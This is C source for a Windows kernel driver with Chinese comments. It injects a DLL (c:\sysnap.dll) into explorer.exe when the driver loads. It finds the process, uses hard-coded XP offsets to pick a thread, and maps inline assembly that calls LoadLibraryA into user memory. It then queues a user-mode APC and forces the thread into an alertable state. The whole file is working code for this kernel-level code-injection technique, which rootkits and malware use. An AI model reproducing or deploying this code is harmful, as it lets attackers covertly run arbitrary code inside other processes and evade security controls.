#include "InjectAPC.h"
//=======================================================================================//
// InjectDll遍历进程,得到根据名字找到我们想要注入的进程,得到进程后遍历线程.找受信??线程序//
//注意这里ETHREAD我是用XP..在其他操作系统可能一些偏移不同                               //
//======================================================================================//

void InjectDll(
	LPSTR DllFullPath,
	LPSTR ProcessName
	)
{
		ULONG pTargetProcess;    
		ULONG pTargetThread;     
		ULONG pNotAlertableThread; 
		ULONG pSystemProcess;    
		ULONG pTempThread;
		ULONG pNextEntry, pListHead, pThNextEntry,pThListHead; 
		ULONG pid;
		PEPROCESS EProcess;
		NTSTATUS status;

		for(pid=0; pid<MAX_PID; pid+=4)
		{
    	status = PsLookupProcessByProcessId((HANDLE)pid,&EProcess);
	    if((NT_SUCCESS(status)))
	    {
		     if(_stricmp(PsGetProcessImageFileName(EProcess),ProcessName)==0)
    		 { 
            pSystemProcess=(ULONG)EProcess;
		        pTargetProcess =pSystemProcess; 
		        pTargetThread = pNotAlertableThread = 0;
            pThListHead = pSystemProcess+0x50;
            pThNextEntry=*(ULONG *)pThListHead;

       			while(pThNextEntry != pThListHead)
       			{
			        pTempThread = pThNextEntry-0x1b0; 
			        if(*(char *)(pTempThread+0x164)) 
			        {
				         pTargetThread =pTempThread;
				         break;
			        }
			        else{
				         pNotAlertableThread =pTempThread;
        			}
      	
			        pThNextEntry = *(ULONG *)pThNextEntry; 
      		 }
       		break; 
      	}
     	}
		}
	
		if(!pTargetProcess)
	   	return;
	
		if(!pTargetThread)
	   	pTargetThread = pNotAlertableThread;
	
		if(pTargetThread)
		{
	  	InstallUserModeApc(DllFullPath,pTargetThread,pTargetProcess);
		}
		else {
	  	 DbgPrint(" No thread found!"); 
		}
}


//释放InstallUserModeApc中分配的内存,一个内核例程
PMDL pMdl = NULL;

void ApcKernelRoutine( IN struct _KAPC *Apc, 
  IN OUT PKNORMAL_ROUTINE *NormalRoutine, 
  IN OUT PVOID *NormalContext, 
  IN OUT PVOID *SystemArgument1, 
  IN OUT PVOID *SystemArgument2 ) 
{

	if (Apc)
	   ExFreePool(Apc);
	if(pMdl)
	{
	   MmUnlockPages(pMdl);
	   IoFreeMdl (pMdl);
	   pMdl = NULL;
	}
	DbgPrint("ApcKernelRoutine called. Memory freed.");
}

//安装APC,首先是把我们要在用户执行的代码映射带用户态的空间MmMapLockedPagesSpecifyCache 
//因为loadlibrary所要用到的参数我们不可能直接用内核的数据....因为它只能在用户态执行,不能访问内核空间,所以我们要把参数做下处理
// memset ((unsigned char*)pMappedAddress + 0x14, 0, 300);
// memcpy ((unsigned char*)pMappedAddress + 0x14, DllFullPath,strlen ( DllFullPath));
// data_addr = (ULONG*)((char*)pMappedAddress+0x9); 
// *data_addr = dwMappedAddress+0x14;

NTSTATUS 
InstallUserModeApc(
	LPSTR DllFullPath, 
	ULONG pTargetThread, 
	ULONG pTargetProcess
	)
{	
		PRKAPC pApc = NULL; 
		PVOID pMappedAddress = NULL; 
		ULONG dwSize = 0;
		KAPC_STATE ApcState; 
		
		ULONG *data_addr=0; 
		ULONG dwMappedAddress = 0; 
		NTSTATUS Status = STATUS_UNSUCCESSFUL;

		if (!pTargetThread || !pTargetProcess)
   		return STATUS_UNSUCCESSFUL;

		/////////////////////////////////////////////////////////////////////////////////////////////////////////// 
		pApc = ExAllocatePool (NonPagedPool,sizeof (KAPC)); 
		if (!pApc)
		{
		   DbgPrint("Failed to allocate memory for the APC structure");
		   return STATUS_INSUFFICIENT_RESOURCES;
		}

		dwSize = (unsigned char*)ApcCreateProcessEnd-(unsigned char*)ApcCreateProcess;
		pMdl = IoAllocateMdl (ApcCreateProcess, dwSize, FALSE,FALSE,NULL);
		if (!pMdl)
		{
		   DbgPrint(" Failed to allocate MDL");
		   ExFreePool (pApc);
		   return STATUS_INSUFFICIENT_RESOURCES;
		}

		__try
		{
		  
		   MmProbeAndLockPages (pMdl,KernelMode,IoWriteAccess);
		}
		__except (EXCEPTION_EXECUTE_HANDLER)
		{
		   DbgPrint("Exception during MmProbeAndLockPages");
		   IoFreeMdl (pMdl);
		   ExFreePool (pApc);
		   return STATUS_UNSUCCESSFUL;
		}


		KeStackAttachProcess((ULONG *)pTargetProcess,&ApcState);//进入目标进程的上下文
		pMappedAddress = MmMapLockedPagesSpecifyCache (pMdl,UserMode,MmCached,NULL,FALSE,NormalPagePriority);

		if (!pMappedAddress)
		{
			DbgPrint("Cannot map address");
			KeUnstackDetachProcess (&ApcState);
			IoFreeMdl (pMdl);
			ExFreePool (pApc);
		
			return STATUS_UNSUCCESSFUL;
		}
		else {
			 DbgPrint("UserMode memory at address: 0x%p",pMappedAddress);
		}

		dwMappedAddress = (ULONG)pMappedAddress;
		memset ((unsigned char*)pMappedAddress + 0x14, 0, 300);//zero everything out ecxept our assembler code
		memcpy ((unsigned char*)pMappedAddress + 0x14, DllFullPath,strlen ( DllFullPath)); //copy the path to the executable
		
		data_addr = (ULONG*)((char*)pMappedAddress+0x9); 
		*data_addr = dwMappedAddress+0x14; 
		
		KeUnstackDetachProcess (&ApcState); 

		//初始化APC,插APC
		KeInitializeApc(pApc,
										(PETHREAD)pTargetThread,
										OriginalApcEnvironment,
										&ApcKernelRoutine,
										NULL,
										pMappedAddress,
										UserMode,
										(PVOID) NULL);
		if (!KeInsertQueueApc(pApc,0,NULL,0))
		{
		   DbgPrint("KernelExec -> Failed to insert APC");
		   MmUnlockPages(pMdl);
		   IoFreeMdl (pMdl);
		   ExFreePool (pApc);
		   return STATUS_UNSUCCESSFUL;
		}
		else
		{
		   DbgPrint("APC delivered");
		}
		//使线程处于警告状态,注意不同操作系统的ETHREAD
		if(!*(char *)(pTargetThread+0x4a))
		{
		  
		   *(char *)(pTargetThread+0x4a) = TRUE;
		}
		
		return 0;
}

__declspec(naked) void ApcCreateProcess(
	PVOID NormalContext, 
	PVOID SystemArgument1, 
	PVOID SystemArgument2
	)
{
    __asm 
    { 
    	mov eax,0x7C801d77
			nop//-------sysnap注:这些nop是保证前面 memset ((unsigned char*)pMappedAddress + 0x14, 0, 300);之类的正常:
			nop//如果改成执行其他函数,注意这些NOP与前面的0x14之类的是否对应
			nop
			push 0xabcd //因为用户程序无法访问内核空间,所以路径不能直接引用lpProcess
			call eax
			jmp end         
			
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			end:
			nop
			ret 0x0c
    }

}
void ApcCreateProcessEnd(){}


VOID Unload(PDRIVER_OBJECT DriverObject)
{ 
	DbgPrint("Driver Unloaded");
}


NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING pRegistryPath)
{
	InjectDll("c:\\sysnap.dll","explorer.exe");
	DriverObject->DriverUnload = Unload; 
	return STATUS_SUCCESS;
}